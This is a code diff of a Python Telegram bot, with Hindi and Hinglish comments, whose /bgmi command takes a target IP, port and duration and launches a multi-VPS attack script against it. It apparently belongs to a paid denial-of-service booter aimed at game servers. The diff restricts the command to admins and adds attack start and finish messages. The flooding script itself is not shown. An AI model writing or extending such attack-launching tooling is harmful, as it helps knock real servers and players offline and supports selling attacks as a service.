@@ -345,28 +345,25 @@ def redeem_key(message):
 
     bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
 
-# ✅ /RS Attack Command (Auto-Remove from /stats)
+# ✅ /attack Command (Attack Start + Finish Message)  
 @bot.message_handler(commands=['bgmi'])
 def handle_attack(message):
     user_id = str(message.from_user.id)
-    chat_id = str(message.chat.id)
 
-    # ✅ यह चेक करेगा कि कमांड सिर्फ ग्रुप में चले
-    if message.chat.id != int(GROUP_ID):
+    # ✅ सिर्फ ग्रुप में काम करेगा  
+    if str(message.chat.id) != GROUP_ID:
         bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
         return
 
-    if not is_user_allowed(user_id):  
-        bot.reply_to(message, "⏳ **YOUR KEY NOT APPROVED! PLEASE REDEEM A NEW KEY.**")
+    # ✅ सिर्फ अलाउड यूज़र ही अटैक कर सकते हैं  
+    if user_id not in ADMINS:
+        bot.reply_to(message, "❌ **AAPKO ATTACK START KARNE KI PERMISSION NAHI HAI!**")
         return
 
-    if user_id not in allowed_users:
-        bot.reply_to(message, "❌ KEY BUY KRKE AANA! FREE MAIN NHI MILEGA!")
-        return
-
+    # ✅ सही कमांड फॉर्मेट चेक करें  
     command = message.text.split()
     if len(command) != 4:
-        bot.reply_to(message, "⚠ USAGE: /bgmi <IP> <PORT> <TIME>")
+        bot.reply_to(message, "⚠ **USAGE:** /bgmi <IP> <PORT> <TIME>")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -375,17 +372,27 @@ def handle_attack(message):
         port = int(port)
         time_duration = int(time_duration)
     except ValueError:
-        bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
+        bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
         return
 
     if time_duration > 300:
-        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 300 SECONDS!")
+        bot.reply_to(message, "🚫 **MAX ATTACK TIME 300 SECONDS HAI!**")
         return
 
-    # ✅ Multi-VPS Attack Command Run (अगर तुम्हारे पास यह सिस्टम है)
-    os.system(f"python3 multivps.py {target} {port} {time_duration}")
+    # ✅ Multivps.py को सही से रन करें  
+    try:
+        subprocess.Popen(["python3", "multivps.py", target, str(port), str(time_duration)])
+        bot.reply_to(message, f"🚀 **Attack Started!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")
 
-    bot.reply_to(message, f"🔥 Attack Started on Multiple VPS!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {time_duration}s")
+        # ✅ Attack Finish Message भेजने के लिए Timer सेट करें  
+        def send_attack_finished():
+            time.sleep(time_duration)
+            bot.send_message(message.chat.id, f"✅ **Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")
+
+        threading.Thread(target=send_attack_finished, daemon=True).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ **Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
 
 # ✅ /STATS Command - Shows Only Active Attacks
 # ✅ /STATS Command - Shows Only Active Attacks
